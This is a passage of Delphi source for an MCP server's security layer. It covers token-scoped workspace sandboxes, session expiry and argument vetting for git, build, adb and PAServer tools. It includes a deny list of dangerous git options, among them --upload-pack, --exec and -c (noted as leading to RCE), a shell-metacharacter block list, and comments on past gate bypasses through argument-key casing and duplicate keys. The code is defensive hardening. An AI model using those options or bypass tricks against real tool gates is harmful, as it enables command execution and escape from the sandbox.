      GIniLogMaxFiles := Ini.ReadInteger('Log', 'MaxFiles', 10);
      // [Workspace.<name>] sections: token-scoped sandboxes. Parsed once,
      // here, so AuthorizeBearer never touches the disk per request.
      var Secs := TStringList.Create;
      try
        Ini.ReadSections(Secs);
        for var S in Secs do
          if S.StartsWith('Workspace.', True) and (S.Length > Length('Workspace.')) then
          begin
            var W: TWorkspaceDef;
            W.Name := S.Substring(Length('Workspace.')).Trim;
            W.Token := Ini.ReadString(S, 'Token', '').Trim;
            // Everyone had typed AuthToken= for years, so the
            // hand writes it again inside a workspace (measured: the operator
            // himself, 2026-09-10, and the server swallowed it silently).
            // Token= is canonical; AuthToken= works as an alias.
            if W.Token = '' then
              W.Token := Ini.ReadString(S, 'AuthToken', '').Trim;
            W.ReadOnlyToken := Ini.ReadString(S, 'ReadOnlyToken', '').Trim;
            W.Profile := LowerCase(Ini.ReadString(S, 'Profile', '').Trim);
            var RawRoots := Ini.ReadString(S, 'Roots', '');
            W.Roots := ParseRootsList(RawRoots);
            W.ReadOnlyPaths := ParseReadOnlyList(
              Ini.ReadString(S, 'ReadOnlyPaths', ''), W.Roots);
            // Mismo lector que Roots: son raices, solo que de lectura.
            W.ReadOnlyRoots := ParseRootsList(Ini.ReadString(S, 'ReadOnlyRoots', ''));
            W.Invalid := (RawRoots.Trim <> '') and (Length(W.Roots) = 0);
            // capability overrides; absent key = inherit the default
            W.OvAllowTests := ReadTriState(Ini, S, 'AllowTests');
            W.OvAllowRemoteRun := ReadTriState(Ini, S, 'AllowRemoteRun');
            W.OvAllowBuildScripts := ReadTriState(Ini, S, 'AllowBuildScripts');
            W.OvLibraryZone := ReadTriState(Ini, S, 'LibraryZone');
            W.OvAgentConfinement := ReadTriState(Ini, S, 'AgentConfinement');
            W.GitRemotes := Ini.ReadString(S, 'GitRemotes', '').Trim;
            W.RemoteHosts := Ini.ReadString(S, 'RemoteHosts', '').Trim;
            W.DelphiVersion := Ini.ReadString(S, 'DelphiVersion', '').Trim;
            W.RemoteProjects := Ini.ReadString(S, 'RemoteRunProjects', '')
              .Split([';'], TStringSplitOptions.ExcludeEmpty);
            W.VaultPath := Ini.ReadString(S, 'VaultPath', '').Trim;
            W.OvVaultReadOnly := ReadTriState(Ini, S, 'VaultReadOnly');
            W.AdbDevices := Ini.ReadString(S, 'AdbAllowedDevices', '')
              .Split([';'], TStringSplitOptions.ExcludeEmpty);
            W.OvSharedSet := Ini.ValueExists(S, 'SharedFolders');
            if W.OvSharedSet then
              W.OvSharedFolders := LowerCase(Ini.ReadString(S, 'SharedFolders', ''))
                .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
            if W.Invalid then
              GWorkspaceNotes := GWorkspaceNotes +
                ['AVISO: [Workspace.' + W.Name + '] Roots= no parsea: ese ' +
                 'workspace no admite a NADIE (fail closed). Revisa la ruta.'];
            if (W.Token <> '') or (W.ReadOnlyToken <> '') then
              GWorkspaces := GWorkspaces + [W]
            else
              GWorkspaceNotes := GWorkspaceNotes +
                ['AVISO: [Workspace.' + W.Name + '] sin Token= ni ' +
                 'ReadOnlyToken=: seccion IGNORADA. La clave es Token= ' +
                 '(AuthToken= tambien vale como alias).'];
          end
          else if SameText(S, 'Workspace') then
            // [Workspace] without the dot is the v0.97 section, and it was
            // EXEMPTED from the warning below - so it was the one spelling
            // that vanished in total silence. Worse: until 2026-09-20 our
            // own refusals sent the operator to edit exactly that section,
            // in 21 user-facing strings ("settings.ini [Workspace] Roots"),
            // two of them shipped inside tools/list. Somebody following our
            // own instructions got no jail, no token, and not one word
            // anywhere saying why. It gets the loudest note of the three.
            GWorkspaceNotes := GWorkspaceNotes +
              ['AVISO: la seccion [Workspace] (sin punto) ya NO existe y se ' +
               'IGNORA entera: sus Roots, sus tokens y sus permisos no ' +
               'valen nada. Desde v0.98 nada es global - renombrala a ' +
               '[Workspace.<nombre>] y dale un Token=.']
          else if S.ToLower.StartsWith('work') then
            // [Workopenclaw], [WorkspaceX]... a workspace section spelled
            // wrong used to vanish silently and its token answered 401 with
            // no clue anywhere (measured 2026-09-10). Name the fix.
            GWorkspaceNotes := GWorkspaceNotes +
              ['AVISO: la seccion [' + S + '] parece un workspace mal ' +
               'escrito y se IGNORA. El formato es [Workspace.<nombre>] ' +
               '(con el punto).'];
      finally
        Secs.Free;
      end;
    finally
      Ini.Free;
    end;
    ComprobarDuplicadosIni(IniPath);
  end;
  // O TOKEN O NADA tambien para el cliente local con credencial: si el
  // entorno trae DELPHI_MCP_TOKEN (o DELPHI_MCP_READONLY_TOKEN, en solo
  // lectura) y coincide con un workspace, el proceso stdio queda ligado a
  // ESA jaula, exactamente como un Bearer en HTTP (David, 2026-09-19).
  // Sin coincidencia no abre nada: el par de entorno sigue inerte.
  for var K := 0 to High(GWorkspaces) do
  begin
    if GWorkspaces[K].Invalid or (Length(GWorkspaces[K].Roots) = 0) then
      Continue;
    if (GAuthToken <> '') and (GWorkspaces[K].Token <> '') and
       (GAuthToken = GWorkspaces[K].Token) then
    begin
      GStdioIx1 := K + 1;
      Break;
    end;
    if (GReadOnlyToken <> '') and (GWorkspaces[K].ReadOnlyToken <> '') and
       (GReadOnlyToken = GWorkspaces[K].ReadOnlyToken) then
    begin
      GStdioIx1 := K + 1;
      GProcessReadOnly := True;
      Break;
    end;
  end;
  GSecLoaded := True;
end;

procedure LogIniSettings(out ALinesPerFile, AMaxFiles: Integer);
begin
  LoadSecurity;
  ALinesPerFile := GIniLogLines;
  AMaxFiles := GIniLogMaxFiles;
end;

function AuthToken: string;
begin
  LoadSecurity;
  Result := GAuthToken;
end;

function ReadOnlyToken: string;
begin
  LoadSecurity;
  Result := GReadOnlyToken;
end;

function AllowRemoteRun: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvAllowRemoteRun = 1); // ausente = apagado
  Result := GAllowRemoteRun;
end;

function LibraryZoneEnabled: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvLibraryZone = 1); // ausente = apagado
  Result := GLibraryZone;
end;

function AllowTests: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvAllowTests = 1); // ausente = apagado
  Result := GAllowTests;
end;

{ A name safe to use as a folder tag: letters, digits, dash, underscore, dot.
  Anything else collapses to '-', so a declared name can never traverse. }
function SanitizeAgent(const AName: string): string;
var
  C: Char;
begin
  Result := '';
  for C in AName.Trim do
    if CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.']) then
      Result := Result + C
    else
      Result := Result + '-';
  Result := Result.Trim(['-', '.']);
  if Length(Result) > 40 then
    Result := Copy(Result, 1, 40);
end;

const
  SESSION_TIMEOUT_DEFAULT_MIN = 720; // 12 h de inactividad
  MINUTOS_POR_DIA = 1440;
  SESIONES_MAX = 256;

{ Bajo GIdentLock. -1 = no esta. }
function IndiceDeSesion(const AId: string): Integer;
var
  I: Integer;
begin
  for I := 0 to GSesiones.Count - 1 do
    if GSesiones[I].Id = AId then
      Exit(I);
  Result := -1;
end;

function SesionCaducada(const S: TSesion; ATopeMin: Double): Boolean;
begin
  Result := (ATopeMin > 0) and ((Now - S.UltimoUso) * MINUTOS_POR_DIA > ATopeMin);
end;

{ Bajo GIdentLock. }
procedure PurgaSesionesCaducadas(ATopeMin: Double);
var
  I: Integer;
begin
  for I := GSesiones.Count - 1 downto 0 do
    if SesionCaducada(GSesiones[I], ATopeMin) then
      GSesiones.Delete(I);
end;

function SessionTimeoutMinutes: Double;
var
  S: string;
begin
  if GSessionTimeoutMin >= 0 then
    Exit(GSessionTimeoutMin);
  S := GetEnvironmentVariable('DELPHI_MCP_SESSION_TIMEOUT_MINUTES').Trim;
  if S = '' then
  begin
    LoadSecurity;
    S := GIniSessionTimeout;
  end;
  { Decimales admitidos (0.05 = tres segundos): asi una bateria mide la
    caducidad sin esperar minutos. Negativo o ilegible = el defecto. }
  Result := StrToFloatDef(S.Replace(',', '.'), SESSION_TIMEOUT_DEFAULT_MIN,
    TFormatSettings.Invariant);
  if Result < 0 then
    Result := SESSION_TIMEOUT_DEFAULT_MIN;
  GSessionTimeoutMin := Result;
end;

procedure BindSessionIdentity(const ASessionId, AName: string);
var
  Clean, Id: string;
  I: Integer;
  S: TSesion;
begin
  Id := ASessionId.Trim;
  if Id = '' then
    Exit;
  Clean := SanitizeAgent(AName);
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(Id);
    if I >= 0 then
    begin
      S := GSesiones[I];
      if Clean <> '' then
        S.Nombre := Clean;
      S.UltimoUso := Now;
      GSesiones[I] := S;
    end
    else
    begin
      S.Id := Id;
      S.Nombre := Clean;
      S.UltimoUso := Now;
      GSesiones.Add(S);
      while GSesiones.Count > SESIONES_MAX do
        GSesiones.Delete(0);
    end;
  finally
    GIdentLock.Leave;
  end;
end;

function SessionState(const ASessionId: string): TSessionState;
var
  Id: string;
  I: Integer;
  S: TSesion;
  Tope: Double;
begin
  Id := ASessionId.Trim;
  if Id = '' then
    Exit(ssUnknown);
  Tope := SessionTimeoutMinutes;
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(Id);
    if I < 0 then
      Result := ssUnknown
    else if SesionCaducada(GSesiones[I], Tope) then
    begin
      GSesiones.Delete(I);
      Result := ssExpired;
    end
    else
    begin
      S := GSesiones[I];
      S.UltimoUso := Now;
      GSesiones[I] := S;
      Result := ssAlive;
    end;
    PurgaSesionesCaducadas(Tope);
  finally
    GIdentLock.Leave;
  end;
end;

function LiveSessionCount: Integer;
begin
  GIdentLock.Enter;
  try
    PurgaSesionesCaducadas(SessionTimeoutMinutes);
    Result := GSesiones.Count;
  finally
    GIdentLock.Leave;
  end;
end;

procedure SetThreadIdentityBySession(const ASessionId: string);
var
  I: Integer;
begin
  TCurrentAgent := '';
  if ASessionId.Trim = '' then
    Exit;
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(ASessionId.Trim);
    if I >= 0 then
      TCurrentAgent := GSesiones[I].Nombre;
  finally
    GIdentLock.Leave;
  end;
end;

procedure SetThreadIdentity(const AName: string);
begin
  TCurrentAgent := SanitizeAgent(AName);
end;

procedure ClearThreadIdentity;
begin
  TCurrentAgent := '';
end;

function CurrentAgent: string;
begin
  Result := TCurrentAgent;
end;

function CurrentAgentOr(const ADefault: string): string;
begin
  if TCurrentAgent <> '' then
    Result := TCurrentAgent
  else
    Result := ADefault;
end;

function WriteTargetDenied(const APath: string): string;
begin
  Result := PathDenied(APath);
  if Result = '' then
    Result := DeadCopyWriteDenied(APath);
end;

function DeadCopyWriteDenied(const APath: string): string;
var
  P: string;
begin
  Result := '';
  // Pascal has no string escapes: '\' here would be TWO literal backslashes
  // and no path on earth contains them. Written that way once (a Python habit
  // leaking into Delphi) and the whole guard matched nothing while looking
  // perfectly correct - the ".by" rule passed only because it has no slash.
  // canonical first: an 8.3 alias like __DELP~1 IS the trash
  P := LongCanonical(APath).ToLower.Replace('/', '\');
  if P.EndsWith('.by') then
    Exit(SR_GUARD_OWNER_MARKER);
  if P.Contains('\__delphi-patch\') or P.EndsWith('\__delphi-patch') then
    Exit(SR_GUARD_DEAD_TRASH);
  // La carpeta de temporales del servidor, por el mismo motivo y uno propio:
  // se puede borrar entera en cualquier momento, asi que escribir ahi es
  // escribir en algo que no tiene por que seguir estando. Leerla si se puede
  // (de ahi se baja una captura con delphi_fetch): esta es la puerta de
  // ESCRIBIR.
  if P.Contains('\__delphi-temp\') or P.EndsWith('\__delphi-temp') then
    Exit(SR_GUARD_DEAD_TEMP);
  if P.Contains('\__history\') or P.Contains('\__recovery\') then
    Exit(SR_GUARD_DEAD_IDE);
end;

procedure CrearCarpeta(const ADir: string);
begin
  if ADir = '' then
    Exit;
  try
    TDirectory.CreateDirectory(ADir);
  except
    // Si despues del intento la carpeta esta, alguien gano la carrera y es
    // exactamente lo que queriamos. Si no esta, el fallo es de verdad.
    if not TDirectory.Exists(ADir) then
      raise;
  end;
end;

function LongCanonical(const APath: string): string;
var
  Full: string;
begin
  Full := TPath.GetFullPath(APath).Replace('/', '\');
  if Full.IndexOf('~') < 0 then
    Exit(Full); // sin 8.3 que deshacer, no se paga el paseo
  Result := CanonicalSubiendo(Full,
    function(const ADir: string; out ASalida: string): Boolean
    var
      Buf: array [0 .. 2047] of Char;
      N: DWORD;
    begin
      N := GetLongPathName(PChar(ADir), @Buf[0], Length(Buf));
      Result := (N > 0) and (N < DWORD(Length(Buf)));
      if Result then
        SetString(ASalida, PChar(@Buf[0]), N);
    end);
end;

function GitRemoteHosts: string;
begin
  LoadSecurity;
  // workspace con nombre: SUS remotos declarados, sin herencia
  if HasActiveWS then
    Exit(ActiveWS.GitRemotes);
  Result := GGitRemotes.Trim;
end;

function RemoteProbeHosts: string;
begin
  LoadSecurity;
  // workspace con nombre: SUS hosts declarados, sin herencia
  if HasActiveWS then
    Exit(ActiveWS.RemoteHosts);
  Result := GRemoteHosts.Trim;
end;

function RemoteRunProjectDenied(const APath: string): string;
var
  Lista: TArray<string>;
  E, Full, Name: string;
begin
  LoadSecurity;
  // La lista del workspace ACTIVO, sin herencia. Y desde el 19-sep-2026 la
  // lista vacia ya no significa "cualquiera de la jaula" sino NADA: era el
  // unico permiso que fallaba abierto, al reves que todo el resto del
  // servidor. Lo que no se declara no existe.
  if HasActiveWS then
    Lista := ActiveWS.RemoteProjects
  else
    Lista := GRemoteProjects;
  if Length(Lista) = 0 then
    Exit(SR_REMOTERUN_NOPROJLIST);
  Result := '';
  // Comodin EXPLICITO del operador: RemoteRunProjects=all (o *) significa
  // cualquier proyecto de la jaula. Declararlo sigue siendo su decision.
  for E in Lista do
    if SameText(E.Trim, 'all') or (E.Trim = '*') then
      Exit;
  try
    Full := TPath.GetFullPath(APath);
  except
    Full := APath;
  end;
  Name := TPath.GetFileNameWithoutExtension(Full);
  for E in Lista do
    if (E.Trim <> '') and (SameText(E.Trim, Name) or SameText(E.Trim, Full)) then
      Exit;
  Result := Format(SR_REMOTERUN_PROJECT_DENIED_FMT,
    [Name, string.Join(', ', Lista)]);
end;

function AllowBuildScripts: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvAllowBuildScripts = 1); // ausente = apagado
  Result := GAllowBuildScripts;
end;

function BindIP: string;
begin
  Result := GetEnvironmentVariable('DELPHI_MCP_BIND_IP');
  if Result <> '' then
    Exit;
  LoadSecurity;
  Result := GIniBindIP;
end;

function PreferredDelphiVersion: string;
begin
  LoadSecurity;
  if HasActiveWS then
    Result := ActiveWS.DelphiVersion
  else
    Result := GDelphiVersion;
  Result := Result.Trim;
  // '36' y '36.0' son la misma: el registro la escribe con decimal
  if (Result <> '') and (Result.IndexOf('.') < 0) then
    Result := Result + '.0';
end;

function VaultPath: string;
begin
  LoadSecurity;
  // El vault es del workspace ACTIVO, como todo lo demas (v0.98): un
  // workspace sin VaultPath= NO tiene vault. Solo el por defecto usa el
  // entorno / [Workspace].
  if HasActiveWS then
    Result := ActiveWS.VaultPath
  else
    Result := GVaultPath;
  Result := Result.Trim.Trim(['"']).Trim;
  if Result <> '' then
    try
      Result := ExcludeTrailingPathDelimiter(TPath.GetFullPath(Result));
    except
      Result := '';
    end;
end;

function VaultConfigured: Boolean;
begin
  var P := VaultPath;
  Result := (P <> '') and TDirectory.Exists(P);
end;

function InVault(const APath: string): Boolean;
var
  Vault: string;
begin
  Result := False;
  Vault := VaultPath;
  if Vault = '' then
    Exit;
  try
    Result := StartsText(IncludeTrailingPathDelimiter(Vault),
      IncludeTrailingPathDelimiter(TPath.GetFullPath(APath)));
  except
    Result := False;
  end;
end;

function VaultWritable: Boolean;
begin
  Result := False;
  if not VaultConfigured then
    Exit;
  LoadSecurity;
  // Solo lectura POR DEFECTO: escribir en el vault se pide a proposito.
  // Un workspace con nombre tiene exactamente lo que declara: VaultReadOnly=0
  // o nada de escritura.
  if HasActiveWS then
    Exit(ActiveWS.OvVaultReadOnly = 0);
  // Workspace por defecto: el entorno gana en AMBOS sentidos (las baterias
  // fuerzan un vault de solo lectura por encima de cualquier ini).
  Result := GVaultEnvWritable; // leido por LoadSecurity con las demas claves
end;

{ Si HAY vault en alguna parte (workspace por defecto o cualquier seccion):
  decide el REGISTRO de las tools vault_* al arrancar, cuando aun no hay
  workspace activo en el hilo. El acceso real de cada peticion lo decide
  VaultConfigured, que resuelve el del workspace ACTIVO. }
function VaultConfiguredAnywhere: Boolean;
var
  W: TWorkspaceDef;
  P: string;
begin
  LoadSecurity;
  P := GVaultPath.Trim.Trim(['"']).Trim;
  if (P <> '') and TDirectory.Exists(P) then
    Exit(True);
  for W in GWorkspaces do
  begin
    P := W.VaultPath.Trim.Trim(['"']).Trim;
    if (P <> '') and TDirectory.Exists(P) then
      Exit(True);
  end;
  Result := False;
end;

procedure ExpandVirtualDrives(const AArguments: TJSONObject); forward;
function ServedDriveLetters: string; forward;
function VirtualUnitOf(ALetter: Char; const AServed: string): string; forward;

// VirtualUnitLetter is declared in the interface now (used by /files too).

function WriteDenied(const AWhat: string): string;
begin
  Result := Format(SR_READ_ONLY_FMT, [AWhat]);
end;

function EscrituraDenegada(const APath: string): string;
begin
  if IsReadOnlyNow then
    Exit(WriteDenied('escribir ' + TPath.GetFileName(ExcludeTrailingPathDelimiter(APath))));
  Result := PathDenied(APath);
end;

{ git "read" commands (diff/show/log...) still take FREEFORM args, and git has
  options that write files, read paths OUTSIDE the repository, or run a
  command - a jail/write escape usable even by a read-only client (measured:
  `diff --output=<abs path>` wrote a file anywhere on disk). Filtered HERE, at
  the single gate, so it applies to EVERY git call in BOTH access levels (the
  -C <repo> confinement does not stop an absolute --output). '' = clean. }
function GitArgDenied(const AArgs: string): string;
var
  Tok, T: string;
begin
  Result := '';
  for Tok in AArgs.Split([' ', #9], TStringSplitOptions.ExcludeEmpty) do
  begin
    T := Tok.ToLower;
    if T.StartsWith('--output') or          // writes a file (diff/show)
       T.StartsWith('--no-index') or        // reads arbitrary paths, any dir
       T.StartsWith('--upload-pack') or T.StartsWith('--receive-pack') or
       T.StartsWith('--exec') or            // runs a remote/local command
       T.StartsWith('--ext-diff') or T.StartsWith('--textconv') or // ext program
       T.StartsWith('--config') or T.StartsWith('-c') or  // arbitrary config -> RCE (--config is -c's long form on clone)
       T.StartsWith('--separate-git-dir') or T.StartsWith('--template') or // write/read outside the dest
       T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
       (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
      Exit(Format(SR_GIT_OPTION_FMT, [Tok]));
  end;
end;

{ Host of a git URL, '' when the token is not a URL at all. Understands the
  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
  [user@]host:path. }
function GitUrlHost(const AToken: string): string;
var
  T: string;
  P: Integer;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  if P > 0 then
    T := Copy(T, P + 3, MaxInt)
  else if (Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T)) then
    T := Copy(T, Pos('@', T) + 1, MaxInt)
  else
    Exit; // not a URL: a branch, a path, an option
  P := Pos('@', T);
  if P > 0 then
    T := Copy(T, P + 1, MaxInt);
  // [::1]:3131 - the host is what the brackets hold, not the bracket
  if T.StartsWith('[') then
  begin
    P := Pos(']', T);
    if P > 1 then
      Exit(Copy(T, 2, P - 2).Trim.ToLower);
    Exit('[' + T); // malformed: keep it unrecognisable so it cannot match
  end;
  for P := 1 to Length(T) do
    if CharInSet(T[P], ['/', ':', '\']) then
    begin
      T := Copy(T, 1, P - 1);
      Break;
    end;
  Result := T.Trim.ToLower;
end;

function GitRemoteDenied(const AText: string): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in AText.Split([' ', #9], TStringSplitOptions.ExcludeEmpty) do
  begin
    Host := GitUrlHost(Tok);
    if Host = '' then
      Continue;
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      Exit(Format(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    for var H in Allowed.Split([',', ';'], TStringSplitOptions.ExcludeEmpty) do
      if SameText(H.Trim, Host) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(Format(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(Format(SR_SHELL_META_FMT, [B]));
end;

{ Reads a tools/call argument the SAME WAY the RTTI binder resolves it
  (TMCPSerializer.NormalizeKey: case-insensitive AND ignoring '_').
  TJSONObject.TryGetValue is case-SENSITIVE, so the gate saw '' for an argument
  sent as "Args" or "com_mand" while the handler received its real value - a
  bypass of EVERY decision made here. The gate never calls TryGetValue on an
  argument again. Objects, arrays and null yield '' (TJSONAncestor.Value). }
function ArgStr(const AArguments: TJSONObject; const AName: string): string;
var
  P: TJSONPair;
  Want: string;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  Want := TMCPSerializer.NormalizeKey(AName);
  for P in AArguments do
    if TMCPSerializer.NormalizeKey(P.JsonString.Value) = Want then
      Exit(P.JsonValue.Value);
end;

{ Two keys that normalize to the SAME parameter make the gate and the binder
  read different values: the binder probes the exact declared casing FIRST, so
  sending "args" with a harmless value AND "Args" with a dangerous one gets the
  first one vetted and the second one executed. Refusing the ambiguity removes
  the whole class instead of guessing which spelling wins. Runs BEFORE
  ExpandVirtualDrives, whose RemovePair also picks the first exact match.
  '' = clean. }
function DuplicateArgDenied(const AArguments: TJSONObject): string;
var
  I, J: Integer;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  for I := 0 to AArguments.Count - 2 do
    for J := I + 1 to AArguments.Count - 1 do
      if TMCPSerializer.NormalizeKey(AArguments.Pairs[I].JsonString.Value) =
         TMCPSerializer.NormalizeKey(AArguments.Pairs[J].JsonString.Value) then
        Exit(Format(SR_ARG_DUPLICATE_FMT,
          [AArguments.Pairs[I].JsonString.Value]));
end;

{ delphi_build's platform/config/target reach a cmd.exe line UNQUOTED
  (rsvars.bat && msbuild ...), so a metacharacter there is arbitrary execution
  that sails past the jail, the low-integrity sandbox and the .dproj
  hazard scanner at once. platform reuses the whitelist that ALREADY exists for
  the .dproj XML sink (Lsp.Dproj.CanonicalPlatform) instead of a second, weaker
  charset test; target is a fixed trio; config is NOT a fixed list - a project
  may declare its own configurations (parity with the IDE), so it is bounded by
  a charset that admits no shell metacharacter. '' = clean. }
{ The identifier rule for a PAServer profile name: it becomes a file name in
  %APPDATA% and travels on command lines (paclient and msbuild /p:Profile=).
  ONE definition - PAServerArgDenied (name) and BuildArgDenied (profile) both
  read it, so the two mouths cannot drift. True = refuse. }
function BadProfileName(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-']) then
        Exit(True);
end;

{ The identifier rule for a device address or serial (adb's ip:port or a
  serial like emulator-5554 / R58M...): what adb itself prints. ONE
  definition - AdbArgDenied (address/device) and BuildArgDenied (deviceid)
  both read it. True = refuse. }
function BadDeviceToken(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', ':', '_', '-']) then
        Exit(True);
end;

{ The adb device allowlist ([Adb] AllowedDevices / DELPHI_MCP_ADB_DEVICES,
  semicolon list): when configured, the ONLY devices this server will
  address - outside it, nothing, at BOTH access levels (David's rule). An
  entry matches the target exactly, or matches its host part (the text
  before ':'), so '192.168.1.163' covers whatever port wifi debugging
  negotiates and a USB serial is listed as-is. Ausente o vacia = NINGUN
  dispositivo: cada workspace declara la suya con AdbAllowedDevices= y lo
  que no se declara no existe (v0.98; antes fallaba abierto). }
function AdbTargetAllowed(const ATarget: string): Boolean;
var
  Lista: TArray<string>;
  E, Host: string;
  P: Integer;
begin
  Result := False;
  LoadSecurity;
  if HasActiveWS then
    Lista := ActiveWS.AdbDevices
  else
    Lista := GAdbDevices;
  Host := ATarget;
  P := Pos(':', ATarget);
  if P > 0 then
    Host := Copy(ATarget, 1, P - 1);
  for E in Lista do
    if SameText(E.Trim, ATarget) or SameText(E.Trim, Host) then
      Exit(True);
end;

{ delphi_adb's address/device land on the adb command line. Same lesson as
  git/build/paserver: one vetting place for both access levels. The apk path
  is a filesystem argument vetted by the tool through ReadPathDenied. }
function AdbArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
begin
  Result := '';
  LoadSecurity;
  V := ArgStr(AArguments, 'address').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(Format(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(Format(SR_ADB_ALLOWLIST_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'device').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(Format(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(Format(SR_ADB_ALLOWLIST_FMT, [V]));
  end;
  // "app" is a package name reaching adb shell am start - same charset rule
  // (a package is letters/digits/dots/underscores), own message.
  V := ArgStr(AArguments, 'app').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(Format(SR_ADB_APP_FMT, [V]));
  // tap coordinates reach adb shell input - digits only. The key name is
  // whitelisted in the tool; here only its charset (letters).
  for var Coord in TArray<string>.Create('x', 'y') do
  begin
    V := ArgStr(AArguments, Coord).Trim;
    if V <> '' then
      for var C in V do
        if not CharInSet(C, ['0'..'9']) then
          Exit(Format(SR_ADB_XY_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'key').Trim;
  if V <> '' then
    for var C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z']) then
        Exit(Format(SR_ADB_KEY_FMT, [V]));
  // Y al final, el target implicito: podria ser un dispositivo NO listado
  // que casualmente es el unico conectado - se nombra o nada. Va tras las
  // reglas de formato para que el error mas util conteste primero. Desde
  // v0.98 la lista es del workspace y vacia = ninguno: sin excepcion.
  if (ArgStr(AArguments, 'device').Trim = '') and
     MatchText(Trim(ArgStr(AArguments, 'command')),
       ['install', 'run', 'tap', 'key', 'logcat', 'screenshot']) then
    Exit(SR_ADB_ALLOWLIST_DEVICE);
end;

function BuildArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
begin
  Result := '';
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and (CanonicalPlatform(V) = '') then
    Exit(Format(SR_BUILD_PLATFORM_FMT, [V]));
  V := ArgStr(AArguments, 'target').Trim;
  if (V <> '') and not MatchText(V, ['Build', 'Make', 'Clean', 'Deploy']) then
    Exit(Format(SR_BUILD_TARGET_FMT, [V]));
  // "profile" is a PAServer profile name reaching the msbuild command line
  // (/p:Profile=) - the same identifier rule as delphi_paserver's "name",
  // ONE definition for both mouths.
  V := ArgStr(AArguments, 'profile').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(Format(SR_PASERVER_NAME_FMT, [V]));
  // "deviceid" is an adb serial reaching msbuild (/p:DeviceId=) - the same
  // rule as delphi_adb's address/device.
  V := ArgStr(AArguments, 'deviceid').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(Format(SR_ADB_TARGET_FMT, [V]));
  // "sdk" reaches the cmd.exe line (/p:PlatformSDK=): a file NAME, never a
  // path and never a metacharacter (audit 2026-09-25). The build also
  // checks it against the SDKs of the platform, like set-sdk does.
  V := ArgStr(AArguments, 'sdk').Trim;
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.']) then
        Exit(Format(SR_BUILD_SDK_NAME_FMT, [V]));
  V := ArgStr(AArguments, 'config');
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.', ' ']) then
        Exit(Format(SR_BUILD_CONFIG_FMT, [V]));
end;

{ delphi_paserver's add-profile/test-connection compose a paclient.exe command
  line (direct CreateProcess, no shell - but a double quote would re-split the
  argument list) and the profile NAME doubles as a file name in %APPDATA%.
  Vetted here for BOTH access levels: one place, same lesson as the git and
  build argument filters. The platform whitelist is paclient's own
  (PACLIENT_PLATFORMS, Lsp.Dproj) - narrower than CanonicalPlatform. The
  password may not carry quotes or control characters; everything else is the
  PAServer's business. '' = clean. }
function PAServerArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
  N: Integer;
begin
  Result := '';
  V := ArgStr(AArguments, 'name').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(Format(SR_PASERVER_NAME_FMT, [V]));
  V := ArgStr(AArguments, 'host').Trim;
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', '-', ':']) then
        Exit(Format(SR_PASERVER_HOST_FMT, [V]));
  V := ArgStr(AArguments, 'port').Trim;
  if V <> '' then
    if not TryStrToInt(V, N) or (N < 1) or (N > 65535) then
      Exit(Format(SR_PASERVER_PORT_FMT, [V]));
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and not MatchText(V, PACLIENT_PLATFORMS) then
    Exit(Format(SR_PASERVER_PLATFORM_FMT, [V]));
  V := ArgStr(AArguments, 'password');
  for C in V do
    if (C < ' ') or (C = '"') then
